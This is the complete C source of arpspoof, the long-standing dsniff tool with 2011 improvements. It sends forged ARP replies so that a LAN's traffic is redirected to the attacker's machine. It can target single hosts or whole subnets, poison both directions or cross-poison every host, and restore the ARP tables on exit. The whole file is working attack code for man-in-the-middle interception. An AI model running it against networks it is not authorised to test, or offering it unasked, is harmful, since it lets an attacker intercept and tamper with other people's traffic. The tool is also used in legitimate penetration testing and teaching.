/*
 * arpspoof.c
 *
 * Redirect packets from a target host (or from all hosts) intended for
 * another host on the LAN to ourselves.
 * 
 * Copyright (c) 1999 Dug Song <dugsong@monkey.org>
 *
 * $Id: arpspoof.c,v 1.5 2001/03/15 08:32:58 dugsong Exp $
 *
 * Improved 2011 by Stefan Tomanek <stefa@pico.ruhr.de>
 */

#include "config.h"

#include <sys/types.h>
#include <sys/param.h>
#include <netinet/in.h>

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <err.h>
#include <libnet.h>
#include <pcap.h>

#include "arp.h"
#include "version.h"

/* time to wait between ARP packets */
#define ARP_PAUSE 100000

extern char *ether_ntoa(struct ether_addr *);

struct host {
	in_addr_t ip;
	struct ether_addr mac;
	uint8_t flags;
};

/* host flags */
#define HOST_ACTIVE (1<<0) /* host is enabled */
#define HOST_SUBNET (1<<1) /* host originates from a subnet scan */
#define HOST_TARGET (1<<2) /* we try to poison the arp cache of this host */
#define HOST_MODEL  (1<<3) /* we are trying to imitate this host and intercept traffic towards it*/
#define HOST_AVOID  (1<<4) /* avoid sending packets to this host */

static int verbose = 0;
static libnet_t *l;
static int n_hosts = 0;
/* number of host slots allocated */
static uint64_t m_hosts = 0;
static struct host *hosts;
static char *intf;
static int poison_reverse;
static int poison_cross;

static uint8_t *my_ha = NULL;
static uint8_t *brd_ha = "\xff\xff\xff\xff\xff\xff";
static uint8_t *zero_ha = "\0\0\0\0\0\0";

static int cleanup_src_own = 1;
static int cleanup_src_host = 0;

static void
usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-v] [-i interface] [-c own|host|both] [-m model[/prefixlength]] [-a avoid[/prefixlength]] [-x] [-r] [target[/prefixlength]]\n");
	exit(1);
}

static int
arp_send(libnet_t *l, int op,
	u_int8_t *sha, in_addr_t spa,
	u_int8_t *tha, in_addr_t tpa,
	u_int8_t *me)
{
	int retval;

	if (!me) me = sha;

	libnet_autobuild_arp(op, sha, (u_int8_t *)&spa,
			     tha, (u_int8_t *)&tpa, l);
	libnet_build_ethernet(tha, me, ETHERTYPE_ARP, NULL, 0, l, 0);
	
	fprintf(stderr, "%s ",
		ether_ntoa((struct ether_addr *)me));

	if (op == ARPOP_REQUEST) {
		fprintf(stderr, "%s 0806 42: arp who-has %s tell %s\n",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(tpa, LIBNET_DONT_RESOLVE),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
	}
	else {
		fprintf(stderr, "%s 0806 42: arp reply %s is-at ",
			ether_ntoa((struct ether_addr *)tha),
			libnet_addr2name4(spa, LIBNET_DONT_RESOLVE));
		fprintf(stderr, "%s\n",
			ether_ntoa((struct ether_addr *)sha));
	}
	retval = libnet_write(l);
	if (retval)
		fprintf(stderr, "%s", libnet_geterror(l));

	libnet_clear_packet(l);

	return retval;
}

#ifdef __linux__
static int
arp_force(in_addr_t dst)
{
	struct sockaddr_in sin;
	int i, fd;
	
	if ((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
		return (0);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = dst;
	sin.sin_port = htons(67);
	
	i = sendto(fd, NULL, 0, 0, (struct sockaddr *)&sin, sizeof(sin));
	
	close(fd);
	
	return (i == 0);
}
#endif

static int
arp_find(in_addr_t ip, struct ether_addr *mac)
{
	int i = 0;

	do {
		if (arp_cache_lookup(ip, mac, intf) == 0)
			return (1);
#ifdef __linux__
		/* XXX - force the kernel to arp. feh. */
		arp_force(ip);
#else
		arp_send(l, ARPOP_REQUEST, NULL, 0, NULL, ip, NULL);
#endif
		usleep(10000);
	}
	while (i++ < 3);

	return (0);
}

static struct host *find_host(in_addr_t ipaddr, uint8_t flags) {
	struct host *h = hosts;
	for (; h->ip; h++) {
		if (h->ip == ipaddr && ((h->flags & flags) == flags) ) return h;
	}
	return NULL;
}

static int host_add(in_addr_t addr, uint8_t flags) {
	struct host *h = NULL;
	if (h = find_host(addr, 0)) {
		/* host is already present in our list, just add flags */
		h->flags |= flags;
		return n_hosts;
	}
	/* host is not in the list, add it */
	if (m_hosts < (n_hosts+2)) {
		hosts = realloc( hosts, (n_hosts+2)*sizeof(struct host) );
		m_hosts = (n_hosts+2);
	}
	hosts[n_hosts].ip = addr;
	hosts[n_hosts].flags = flags;
	/* zero terminate the final entry */
	n_hosts++;
	memset(&hosts[n_hosts], 0, sizeof(struct host));
	return n_hosts;
}

static int subnet_add(in_addr_t addr, int prefix_length, uint8_t flags) {
	int result = n_hosts;
	//uint32_t mask = ~( (~(uint32_t)0) >> prefix_length );
	uint32_t mask = ~( UINT32_MAX >> prefix_length );
	uint32_t net = (ntohl((uint32_t)addr)) & mask;
	uint32_t brd = (ntohl((uint32_t)addr)) | ~mask;
	uint32_t a;
	if (prefix_length == 32) {
		/* there is no network, only the single host! */
		return host_add(addr, flags);
	}
	/* make sure we do not have to reallocate for every host */
	uint64_t nethosts = ((uint64_t)1<<(32-prefix_length)+1);
	if (m_hosts < nethosts) {
		hosts = realloc( hosts, nethosts*sizeof(struct host) );
		m_hosts = nethosts;
	}
	for (a = net+1; a<brd; a++) {
		in_addr_t ia = (in_addr_t) htonl(a);
		result = host_add(ia, HOST_SUBNET|flags);
	}
	return result;
}

static int count_hosts(uint8_t flags, uint8_t nflags) {
	int n = 0;
	struct host *target = hosts;
	for (; target->ip; target++)
		if ((target->flags & flags) == flags && !(target->flags & nflags)) n++;
	return n;
}

static void
cleanup(int sig)
{
	int i;
	int rounds = (cleanup_src_own*5 + cleanup_src_host*5);

	fprintf(stderr, "Cleaning up and re-arping targets...\n");
	for (i = 0; i < rounds; i++) {
		struct host *target = hosts;
		for(;target->ip;target++) {
			uint8_t *src_ha = NULL;

			if (!(target->flags & HOST_TARGET)) continue;
			if (!(target->flags & HOST_ACTIVE)) continue;
			if (target->flags & HOST_AVOID) continue;

			struct host *model = hosts;
			for(;model->ip;model++) {
				if (!(model->flags & HOST_ACTIVE)) continue;
				int fw = arp_find(target->ip, &target->mac);
				int bw = poison_reverse;

				if (!(model->flags & HOST_MODEL)) continue;

				if (cleanup_src_own && (i%2 || !cleanup_src_host)) {
					src_ha = my_ha;
				}
				/* XXX - on BSD, requires ETHERSPOOF kernel. */
				if (fw) {
					arp_send(l, ARPOP_REPLY,
						 (u_int8_t *)&model->mac, model->ip,
						 (u_int8_t *)&target->mac, target->ip,
						 src_ha);
					/* we have to wait a moment before sending the next packet */
					usleep(ARP_PAUSE);
				}
				if (bw) {
					arp_send(l, ARPOP_REPLY,
						 (u_int8_t *)&target->mac, target->ip,
						 (u_int8_t *)&model->mac, model->ip,
						 src_ha);
					usleep(ARP_PAUSE);
				}
			}
		}
	}

	exit(0);
}

static int cmd_hosts_add(char *arg, uint8_t flags) {
	unsigned int scan_prefix_length = 32;
	in_addr_t target_addr = 0;
	char *scan_prefix = strchr(arg, '/');
	/* do we have to scan an entire subnet? */
	if (scan_prefix) {
		*scan_prefix = '\0';
		if (!sscanf(scan_prefix+1, "%u", &scan_prefix_length) || scan_prefix_length > 32) {
			usage();
		}
	}
	target_addr = libnet_name2addr4(l, arg, LIBNET_RESOLVE);
	if (target_addr == -1) {
		usage();
	}
	return subnet_add(inet_addr(arg), scan_prefix_length, flags);
}

int
main(int argc, char *argv[])
{
	extern char *optarg;
	extern int optind;
	char pcap_ebuf[PCAP_ERRBUF_SIZE];
	char libnet_ebuf[LIBNET_ERRBUF_SIZE];
	int c;
	char *cleanup_src = NULL;

	intf = NULL;
	poison_reverse = 0;
	poison_cross = 0;
	n_hosts = 0;

	hosts = calloc(1, sizeof(struct host));;
	m_hosts = 1;

	while ((c = getopt(argc, argv, "vrxm:i:c:a:h?V")) != -1) {
		switch (c) {
		case 'v':
			verbose = 1;
			break;
		case 'i':
			intf = optarg;
			break;
		case 'r':
			poison_reverse = 1;
			break;
		case 'x':
			poison_cross = 1;
			break;
		case 'm':
			cmd_hosts_add(optarg, HOST_MODEL);
			break;
		case 'a':
			cmd_hosts_add(optarg, HOST_AVOID);
			break;
		case 'c':
			cleanup_src = optarg;
			break;
		default:
			usage();
		}
	}
	argc -= optind;
	argv += optind;
	
	if (!cleanup_src || strcmp(cleanup_src, "own")==0) { /* default! */
		/* only use our own hw address when cleaning up,
		 * not jeopardizing any bridges on the way to our
		 * target
		 */
		cleanup_src_own = 1;
		cleanup_src_host = 0;
	} else if (strcmp(cleanup_src, "host")==0) {
		/* only use the target hw address when cleaning up;
		 * this can screw up some bridges and scramble access
		 * for our own host, however it resets the arp table
		 * more reliably
		 */
		cleanup_src_own = 0;
		cleanup_src_host = 1;
	} else if (strcmp(cleanup_src, "both")==0) {
		cleanup_src_own = 1;
		cleanup_src_host = 1;
	} else {
		errx(1, "Invalid parameter to -c: use 'own' (default), 'host' or 'both'.");
		usage();
	}

	while (argc--) {
		cmd_hosts_add(argv[0], HOST_TARGET);
		argv++;
	}

	if (poison_cross) {
		struct host *host = hosts;
		for(;host->ip; host++) {
			host->flags |= (HOST_TARGET|HOST_MODEL);
		}
	}

	if (intf == NULL && (intf = pcap_lookupdev(pcap_ebuf)) == NULL)
		errx(1, "%s", pcap_ebuf);
	
	if ((l = libnet_init(LIBNET_LINK, intf, libnet_ebuf)) == NULL)
		errx(1, "%s", libnet_ebuf);

	fprintf(stderr, "Scanning %d hw addresses...\n", n_hosts);
	struct host *target = hosts;
	for (; target->ip; target++) {
		if (verbose) {
			fprintf(stderr, "Looking up host %s...\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
		}
		int arp_status = arp_find(target->ip, &target->mac);
		if (arp_status &&
				/* just make sure we are not getting an empty or broadcast address */
				(memcmp(&target->mac, zero_ha, sizeof(struct ether_addr)) != 0) &&
				(memcmp(&target->mac, brd_ha, sizeof(struct ether_addr)) != 0)) {
			target->flags |= HOST_ACTIVE;
			if (target->flags & HOST_SUBNET) {
				fprintf(stderr, "Found host in subnet %s: %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE), ether_ntoa((struct ether_addr *)&target->mac));
			}
		} else {
			target->flags &= (~HOST_ACTIVE);
			if (! (target->flags & HOST_SUBNET)) {
				fprintf(stderr, "Unable to find specified host %s\n", libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
			}
			if (poison_reverse && target->flags & HOST_MODEL) {
				errx(1, "couldn't arp for spoof host %s",
					libnet_addr2name4(target->ip, LIBNET_DONT_RESOLVE));
				usage();
			}
		}
	}

	if ((my_ha = (u_int8_t *)libnet_get_hwaddr(l)) == NULL) {
		errx(1, "Unable to determine own mac address");
	}

	if (count_hosts( HOST_ACTIVE | HOST_TARGET, HOST_AVOID ) == 0) {
		errx(1, "No target hosts found.");
	}

	if (count_hosts( HOST_ACTIVE | HOST_MODEL, 0 ) == 0) {
		errx(1, "No model hosts found.");
	}

	signal(SIGHUP, cleanup);
	signal(SIGINT, cleanup);
	signal(SIGTERM, cleanup);

	fprintf(stderr, "Starting spoofing process...\n");
	for (;;) {
		struct host *target = hosts;
		for(;target->ip; target++) {
			if (!(target->flags & HOST_TARGET)) continue;
			if (!(target->flags & HOST_ACTIVE)) continue;
			if (target->flags & HOST_AVOID) continue;
			struct host *model = hosts;
			for (;model->ip; model++) {
				if (!(model->flags & HOST_ACTIVE)) continue;
				if (!(model->flags & HOST_MODEL)) continue;
				if (target->ip != model->ip) {
					arp_send(l, ARPOP_REPLY, my_ha, model->ip,
						(u_int8_t *) &target->mac, target->ip,
						my_ha);
					usleep(ARP_PAUSE);
					if (poison_reverse) {
						arp_send(l, ARPOP_REPLY, my_ha, target->ip, (uint8_t *)&model->mac, model->ip, my_ha);
						usleep(ARP_PAUSE);
					}
				}
			}
		}

		sleep(2);
	}
	/* NOTREACHED */

	exit(0);
}
